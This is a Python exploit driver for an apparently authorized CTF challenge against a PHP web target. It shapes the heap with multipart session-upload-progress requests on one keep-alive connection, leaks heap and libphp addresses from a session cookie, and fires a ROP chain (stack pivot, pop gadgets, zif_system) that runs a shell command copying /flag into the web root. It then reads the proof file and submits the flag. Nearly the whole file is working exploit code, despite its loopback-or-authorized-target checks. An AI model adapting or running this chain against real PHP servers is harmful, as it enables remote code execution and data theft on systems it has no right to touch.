#!/usr/bin/env python3
"""Single-connection bridge driver (C1-C5).

The tight-pair topology was structurally broken: pre-staging the consumer on its
own connection parked it on W_c, forcing the arm onto W_a. This driver instead
sends arm then consumer on ONE keep-alive connection so prefork serves both on
the same child (deterministic co-location when the front preserves the origin
connection).

Modes:
  local-leak      single-connection arm->consumer 3/3 validation (C2 part 1)
  local-pipeline  pipelined variant locally (C1)
  local-chain     full chain arm->leak->fire->/flag locally (C2 part 2)
  live            single-connection pairs against the authorized CTF (C3)
  live-pipeline   pipelined variant against the CTF (C1 secondary)
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import secrets
import socket
import ssl
import struct
import sys
import time
import urllib.parse

sys.path.insert(0, "/root/chainetool-v106/e2e")
sys.path.insert(0, "/root/cfctf-mirror")
sys.path.insert(0, "/root/bridge")
sys.path.insert(0, "/root/bridge/stock")

from p2s import transplant  # noqa: E402
import pin  # noqa: E402  (keep-alive-aware read_response / open_sock)
import php8511_rce as ref  # noqa: E402  (RCE fire builder)

# --- bridge-stock proven constants (B4/SameBin) ---
DTOR = 0x7AE960
ZIF_SYSTEM = 0x598650
PIVOT = 0x6362AE
POP_RDI = 0x280D8D
POP_RSI = 0x2CBE07
RET = 0x280D8E
BLOCK_OFFSET = 0x59400
RCE_HEADERS = 402500

ARM_BOUNDARY = b"S" * 17
DISC_BOUNDARY = b"B" * 10
ARM_LINES = 470000
PREAMBLE = (1 << 20) + 8192          # 1,056,768 B (WAF inspection-window pad)
FILLERS = 841
ARRAYS = 150
FORGE_BYTES = 56
WINDOW = 0x20000

STRICT_LEAK = 131072
ORDINARY = 32
LIVE_HOST = "php-rce.cloudflare.app"
LIVE_PATH = "/php/index.php"
VERIFY_PATH = "/api/verify"
FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,24}\{[^\r\n}]{4,256}\}")
LOCK_GLOBS = ("/tmp/cfctf-r8-live*", "/root/cfctf-r8-live*")


# ---------------------------------------------------------------------------
# builders
# ---------------------------------------------------------------------------
def add_preamble(body: bytes) -> bytes:
    return b"z" * (PREAMBLE - 2) + b"\r\n" + body


def arm_body() -> bytes:
    """Published bridge arm (disclosure substrate: PS(id) dangles)."""
    return transplant._parts_to_body(transplant._arm_parts(ARM_LINES),
                                     ARM_BOUNDARY)


def forged_header(buf: bytearray, window: int = WINDOW) -> None:
    struct.pack_into("<I", buf, 0x00, 0)
    struct.pack_into("<I", buf, 0x04, 0x16)
    struct.pack_into("<Q", buf, 0x08, 0)
    struct.pack_into("<Q", buf, 0x10, window)
    buf[0x18] = ord("/")


def disclosure_body_b56(forges: int = 5) -> bytes:
    """56-byte same-bin (bin-7) forge consumer, last / 48 / 5 (P1 winner).

    Forge-LAST is the proven local shape: 48B fillers (73B zend_string -> bin 8)
    are load-bearing heap-shaping, and the 56B forge (57B raw buffer -> bin 7)
    first-fits the slot only when it runs AFTER the fillers. Forge-first and
    off-bin fillers were both refuted (see FORGE-FIRST-VERDICT.md).
    """
    parts = [("PHPSESSID", transplant.WINDOW_SID),
             ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(FILLERS):
        parts.append((str(1000 + i), (f"v{i:04d}" + "x" * 44)[:48].encode()))
    for j in range(forges):
        forge = bytearray(b"\x00" * FORGE_BYTES)
        forged_header(forge)
        parts.append((f"F{j:02d}", bytes(forge)))
    for i in range(ARRAYS):
        parts.append((f"a{i:04d}[0]", b"x"))
    return transplant._parts_to_body(parts, DISC_BOUNDARY)


def build_rce_body(heap: int, libphp: int, command: str) -> bytes:
    ns = argparse.Namespace(
        rce_block_offset=BLOCK_OFFSET, rce_headers=RCE_HEADERS,
        pivot_offset=PIVOT, pop_rdi_offset=POP_RDI,
        pop_rsi_offset=POP_RSI, ret_offset=RET,
        zif_system_offset=ZIF_SYSTEM)
    return ref.build_rce_body(ns, heap, libphp, command)


# ---------------------------------------------------------------------------
# transport
# ---------------------------------------------------------------------------
def open_sock(host, port, tls, timeout=180.0):
    sock = socket.create_connection((host, port), timeout)
    if tls:
        sock = ssl.create_default_context().wrap_socket(sock,
                                                        server_hostname=host)
    sock.settimeout(timeout)
    return sock


def post_head(path: str, host_header: str, boundary: bytes, length: int,
              keepalive: bool) -> bytes:
    conn = "keep-alive" if keepalive else "close"
    return (b"POST " + path.encode() + b" HTTP/1.1\r\nHost: "
            + host_header.encode()
            + b"\r\nUser-Agent: cfctf-bridge-single-conn/1\r\n"
            + b"Content-Type: multipart/form-data; boundary=" + boundary
            + b"\r\nContent-Length: " + str(length).encode()
            + b"\r\nConnection: " + conn.encode() + b"\r\n\r\n")


def status_of(raw: bytes) -> int:
    m = re.match(rb"HTTP/1\.[01] (\d{3})", raw)
    return int(m.group(1)) if m else 0


def cookie_of(header: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n;]*?)(?:;|$)", header)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1))


def attempt_id_of(header: bytes) -> str:
    m = re.search(rb"(?i)x-attempt-id:\s*([^\r\n]+)", header)
    return m.group(1).decode("latin1", "replace").strip() if m else ""


def read_one(sock, buffer: bytes = b"") -> tuple[bytes, bytes, bytes]:
    """Read one HTTP/1.1 response; robust to missing Content-Length.

    Falls back to a short bounded drain when the response carries neither
    Content-Length nor chunked (so keep-alive left-over bytes are captured,
    not mis-framed as the next response).
    """
    header, body, rest = pin.read_response(sock, buffer)
    # pin.read_response returns body=b"" for responses with no framing; in that
    # case `rest` holds the buffered body bytes. Drain them so the connection
    # stays aligned for the next keep-alive request.
    if not body and not rest and not header:
        return b"", b"", b""
    return header, body, rest


def classify(status: int, cookie: bytes) -> str:
    if status >= 500:
        return "crash"
    cl = len(cookie)
    if cl == STRICT_LEAK:
        return "leak"
    if cl in (48, 8):
        return "partial"
    if cl == ORDINARY:
        return "ordinary"
    if cl == 0:
        return "no_cookie"
    return "other"


def decode_leak(cookie: bytes):
    if not cookie or len(cookie) <= 256:
        return None
    dec = transplant.decode(cookie, DTOR)
    if dec["heap"] and dec["libphp"]:
        return dec
    return None


def single_pair(host, port, tls, path, host_header, arm, disc, timeout,
                pipeline: bool = False):
    """One arm + one consumer on a single connection.

    pipeline=True writes both requests back-to-back before reading (the
    HTTP/1.1 pipelined variant).
    """
    row = {}
    sock = None
    try:
        sock = open_sock(host, port, tls, timeout)
        arm_head = post_head(path, host_header, ARM_BOUNDARY, len(arm), True)
        disc_head = post_head(path, host_header, DISC_BOUNDARY, len(disc), False)
        if pipeline:
            sock.sendall(arm_head + arm + disc_head + disc)
        else:
            sock.sendall(arm_head + arm)
        arm_header, arm_body, leftover = pin.read_response(sock, b"")
        arm_status = status_of(arm_header)
        arm_oom = (b"Allowed memory size" in arm_body
                   or b"Allowed memory size" in arm_header
                   or b"Allowed memory size" in leftover)
        if not pipeline:
            sock.sendall(disc_head + disc)
            disc_header, disc_body, _ = pin.read_response(sock, leftover)
        else:
            disc_header, disc_body, _ = pin.read_response(sock, leftover)
        disc_status = status_of(disc_header)
        cookie = cookie_of(disc_header)
        row.update({
            "arm_status": arm_status,
            "arm_oom": bool(arm_oom),
            "cons_status": disc_status,
            "cookie_len": len(cookie),
            "cookie_sha256": hashlib.sha256(cookie).hexdigest() if cookie else "",
            "attempt_id": attempt_id_of(disc_header),
        })
        return row, cookie
    except Exception as exc:  # transport evidence, never leak evidence
        row.update({"error": repr(exc)})
        return row, b""
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


# ---------------------------------------------------------------------------
# fire + verify
# ---------------------------------------------------------------------------
def fire_and_read(host, port, tls, path, host_header, heap, libphp,
                  proof_name, timeout):
    """Fire the RCE sink (block 0x59400) -> read /flag via proof file."""
    command = f"cat /flag > /var/www/html/{proof_name}"
    if len(command.encode()) + 1 > 48:
        raise RuntimeError("fire command exceeds the 48-byte carrier")
    body = add_preamble(build_rce_body(heap, libphp, command))
    sock = None
    try:
        sock = open_sock(host, port, tls, timeout)
        head = post_head(path, host_header, ref.RCE_BOUNDARY, len(body), False)
        sock.sendall(head + body)
        raw = bytearray()
        while len(raw) < (8 << 20):
            try:
                chunk = sock.recv(65536)
            except (socket.timeout, ssl.SSLError, OSError):
                break
            if not chunk:
                break
            raw.extend(chunk)
        rce_raw = bytes(raw)
    except Exception as exc:
        rce_raw = b""
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass

    time.sleep(0.8)
    proof_raw = b""
    sock = None
    try:
        sock = open_sock(host, port, tls, 20.0)
        sock.sendall(b"GET /" + proof_name.encode()
                     + b" HTTP/1.1\r\nHost: " + host_header.encode()
                     + b"\r\nConnection: close\r\n\r\n")
        buf = bytearray()
        while len(buf) < (1 << 20):
            try:
                chunk = sock.recv(65536)
            except (socket.timeout, ssl.SSLError, OSError):
                break
            if not chunk:
                break
            buf.extend(chunk)
        proof_raw = bytes(buf)
    except Exception:
        proof_raw = b""
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass

    proof_body = proof_raw.partition(b"\r\n\r\n")[2]
    inband = FLAG_RE.search(rce_raw)
    m = FLAG_RE.search(proof_body)
    flag = (m.group(0).decode("ascii", "replace") if m
            else (inband.group(0).decode("ascii", "replace") if inband else None))
    return {
        "rce_status": status_of(rce_raw),
        "rce_bytes": len(rce_raw),
        "proof_status": status_of(proof_raw),
        "proof_bytes": len(proof_body),
        "flag": flag,
    }


def post_verify(host, port, tls, host_header, attempt_id, flag):
    payload = json.dumps({"attemptId": attempt_id, "flag": flag},
                         separators=(",", ":")).encode()
    sock = None
    try:
        sock = open_sock(host, port, tls, 30.0)
        head = (b"POST " + VERIFY_PATH.encode() + b" HTTP/1.1\r\nHost: "
                + host_header.encode() + b"\r\nContent-Type: application/json\r\n"
                + b"Content-Length: " + str(len(payload)).encode()
                + b"\r\nConnection: close\r\n\r\n")
        sock.sendall(head + payload)
        raw = bytearray()
        while len(raw) < (1 << 20):
            try:
                chunk = sock.recv(65536)
            except (socket.timeout, ssl.SSLError, OSError):
                break
            if not chunk:
                break
            raw.extend(chunk)
        body = bytes(raw).partition(b"\r\n\r\n")[2]
        try:
            doc = json.loads(body.decode())
        except Exception:
            doc = {}
        return {"status": status_of(bytes(raw)),
                "verified": bool(doc.get("verified")),
                "permalink": doc.get("permalink")}
    except Exception as exc:
        return {"status": 0, "error": repr(exc)}
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


# ---------------------------------------------------------------------------
# coordination lock
# ---------------------------------------------------------------------------
def coordination_lock_active() -> list:
    now = time.time()
    bad = []
    for g in LOCK_GLOBS:
        import glob as _g
        for p in _g.glob(g):
            try:
                if now - os.path.getmtime(p) < 300:
                    bad.append((p, round(now - os.path.getmtime(p), 1)))
            except OSError:
                pass
    return bad


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=("local-leak", "local-pipeline",
                                       "local-chain", "live", "live-pipeline"),
                    default="local-leak")
    ap.add_argument("--target", default="http://127.0.0.1:19293/index.php")
    ap.add_argument("--runs", type=int, default=3)
    ap.add_argument("--pairs", type=int, default=40)
    ap.add_argument("--forges", type=int, default=5)
    ap.add_argument("--timeout", type=float, default=180.0)
    ap.add_argument("--pipeline", action="store_true")
    ap.add_argument("--authorized-live", action="store_true")
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    parsed = urllib.parse.urlsplit(args.target)
    scheme = parsed.scheme
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path or "/"
    tls = (scheme == "https")

    is_live = (scheme == "https" and host == LIVE_HOST and port == 443
               and path == LIVE_PATH)
    is_local = host in ("127.0.0.1", "localhost", "::1")
    if is_live:
        if not args.authorized_live:
            print("refusing: live target requires --authorized-live")
            return 2
        bad = coordination_lock_active()
        if bad:
            print("REFUSE: coordination lock active:")
            for p, a in bad:
                print(f"  {p} age={a}s")
            return 3
    elif is_local:
        pass
    else:
        print(f"refusing: {args.target} is neither live-authorized nor loopback")
        return 2

    host_header = LIVE_HOST if is_live else (f"{host}:{port}" if port not in (80, 443) else host)

    out = Path_ = None
    import pathlib
    out = pathlib.Path(args.out)
    out.mkdir(parents=True, exist_ok=True)

    lock_marker = None
    if is_live:
        lock_marker = pathlib.Path(f"/root/cfctf-r8-live-marker-{int(time.time())}.lock")
        lock_marker.write_text("active\n")

    arm = add_preamble(arm_body())
    disc = add_preamble(disclosure_body_b56(args.forges))
    print(f"arm_wire={len(arm)} disc_wire={len(disc)} forges={args.forges} "
          f"mode={args.mode} live={is_live}", flush=True)

    receipt = {"target": args.target, "mode": args.mode, "live": is_live,
               "started_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
               "rows": []}

    def flush():
        (out / "receipt.json").write_text(json.dumps(receipt, indent=2) + "\n")

    # --- local validation modes ---
    if args.mode in ("local-leak", "local-pipeline"):
        pipeline = (args.mode == "local-pipeline") or args.pipeline
        leaks = 0
        for run in range(args.runs):
            row, cookie = single_pair(host, port, tls, path, host_header,
                                      arm, disc, args.timeout, pipeline)
            cls = classify(row.get("cons_status", 0), cookie)
            row["class"] = cls
            dec = decode_leak(cookie)
            row["strict"] = bool(dec)
            if dec:
                row["heap"] = hex(dec["heap"])
                row["libphp"] = hex(dec["libphp"])
                row["heap_votes"] = dec["heap_votes"]
                row["module_votes"] = dec["module_votes"]
                leaks += 1
            receipt["rows"].append(row)
            print(f"run {run}: arm_oom={row.get('arm_oom')} "
                  f"cons={row.get('cons_status')} cookie={row.get('cookie_len')} "
                  f"class={cls} strict={bool(dec)}", flush=True)
            time.sleep(0.3)
        receipt["leaks"] = leaks
        receipt["rate"] = round(leaks / args.runs, 3)
        flush()
        print(json.dumps({"mode": args.mode, "leaks": leaks,
                          "rate": receipt["rate"]}))
        return 0 if leaks == args.runs else 2

    # --- local full chain ---
    if args.mode == "local-chain":
        row, cookie = single_pair(host, port, tls, path, host_header,
                                  arm, disc, args.timeout, False)
        dec = decode_leak(cookie)
        cls = classify(row.get("cons_status", 0), cookie)
        row["class"] = cls
        receipt["rows"].append(row)
        if not dec:
            row["strict"] = False
            receipt["verdict"] = "LEAK_MISS"
            flush()
            print("LEAK_MISS")
            return 2
        row["strict"] = True
        row["heap"] = hex(dec["heap"])
        row["libphp"] = hex(dec["libphp"])
        proof = f"f{secrets.token_hex(4)}"
        fr = fire_and_read(host, port, tls, path, host_header,
                           dec["heap"], dec["libphp"], proof, args.timeout)
        receipt["fire"] = fr
        receipt["verdict"] = "FLAG_OK" if fr["flag"] else "RCE_MISS"
        flush()
        print(json.dumps(fr))
        print("FLAG_OK" if fr["flag"] else "RCE_MISS")
        return 0 if fr["flag"] else 3

    # --- live modes (C3 / C1 secondary) ---
    pipeline = (args.mode == "live-pipeline") or args.pipeline
    counts = {"leak": 0, "crash": 0, "partial": 0, "ordinary": 0,
              "no_cookie": 0, "other": 0}
    req_count = 0
    backoffs = 0
    hit = None
    hit_row = None
    max_requests = args.pairs * 2

    for pair_i in range(args.pairs):
        if lock_marker is not None:
            try:
                lock_marker.touch()
            except OSError:
                pass
        if req_count + 2 > max_requests:
            print("STOP: budget exhausted", flush=True)
            break
        row, cookie = single_pair(host, port, tls, path, host_header,
                                  arm, disc, args.timeout, pipeline)
        req_count += 2
        cls = classify(row.get("cons_status", 0), cookie)
        row["class"] = cls
        row["pair"] = pair_i
        counts[cls] = counts.get(cls, 0) + 1
        receipt["rows"].append(row)
        print(f"P{pair_i:03d} arm={row.get('arm_status')} "
              f"oom={row.get('arm_oom')} cons={row.get('cons_status')} "
              f"cookie={row.get('cookie_len')} class={cls}", flush=True)
        if cookie and len(cookie) not in (32,):
            print(f"    cookie_hex={cookie.hex()[:160]}", flush=True)

        if row.get("arm_status") in (403, 429, 503) or \
           row.get("cons_status") in (403, 429, 503):
            backoffs += 1
            print(f"backoff {backoffs}; sleeping 120s", flush=True)
            if backoffs >= 2:
                print("STOP: 2 backoffs", flush=True)
                break
            time.sleep(120)

        if cls == "leak" or (cookie and len(cookie) > 32):
            dec = decode_leak(cookie)
            if dec:
                hit = dec
                hit_row = row
                print(f"[+] STRICT LEAK heap={dec['heap']:#x} "
                      f"libphp={dec['libphp']:#x} "
                      f"votes={dec['heap_votes']}/{dec['module_votes']}",
                      flush=True)
                break
        time.sleep(0.4)

    if hit is not None:
        proof = f"f{secrets.token_hex(4)}"
        fr = fire_and_read(host, port, tls, path, host_header,
                           hit["heap"], hit["libphp"], proof, args.timeout)
        receipt["fire"] = fr
        attempt_id = (hit_row or {}).get("attempt_id", "")
        print(f"fire: {json.dumps(fr)}", flush=True)
        if fr.get("flag"):
            receipt["verdict"] = "FLAG_OK"
            if attempt_id:
                v = post_verify(host, port, tls, host_header, attempt_id,
                                fr["flag"])
                receipt["verify"] = v
                print(f"verify: {json.dumps(v)}", flush=True)
            flush()
            if lock_marker is not None:
                try:
                    lock_marker.unlink()
                except OSError:
                    pass
            print("FLAG_OK")
            return 0
        receipt["verdict"] = "RCE_MISS"
        flush()
        if lock_marker is not None:
            try:
                lock_marker.unlink()
            except OSError:
                pass
        print("RCE_MISS")
        return 3

    receipt["summary"] = {"counts": counts, "req_count": req_count,
                          "backoffs": backoffs,
                          "finished_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ",
                                                        time.gmtime())}
    receipt["verdict"] = "LEAK_MISS"
    flush()
    if lock_marker is not None:
        try:
            lock_marker.unlink()
        except OSError:
            pass
    print(json.dumps({"verdict": "LEAK_MISS", "counts": counts,
                      "req_count": req_count, "backoffs": backoffs}))
    return 1


if __name__ == "__main__":
    sys.exit(main())
